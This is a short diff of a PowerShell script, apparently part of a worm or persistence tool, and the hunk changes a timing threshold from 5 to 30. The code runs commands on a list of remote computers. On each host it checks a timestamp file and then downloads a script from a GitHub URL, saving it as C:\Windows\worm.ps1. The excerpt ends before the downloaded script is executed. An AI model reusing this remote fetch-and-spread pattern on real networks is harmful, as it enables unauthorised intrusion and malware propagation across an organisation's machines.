@@ -18,7 +18,7 @@ Foreach($i in $computerNames){
     invoke-command -ComputerName $i -ScriptBlock {
         #get-content -path 'C:\Users\Public\Downloads\desktop.log') -lt ([int][double]::Parse((get-date -UFormat %s))) - 5 
         if(Test-Path 'C:\Users\Public\Downloads\desktop.log' ){
-            if((get-content -path 'C:\Users\Public\Downloads\desktop.log') -lt ([int][double]::Parse((get-date -UFormat %s))) - 5){
+            if((get-content -path 'C:\Users\Public\Downloads\desktop.log') -lt ([int][double]::Parse((get-date -UFormat %s))) - 30){
                 Invoke-Command -ScriptBlock {
                 $WebClient = New-Object System.Net.WebClient
                 $WebClient.DownloadFile("https://raw.githubusercontent.com/Magrene/PowershellShell/master/EnumerateDomain.ps1","C:\Windows\worm.ps1")
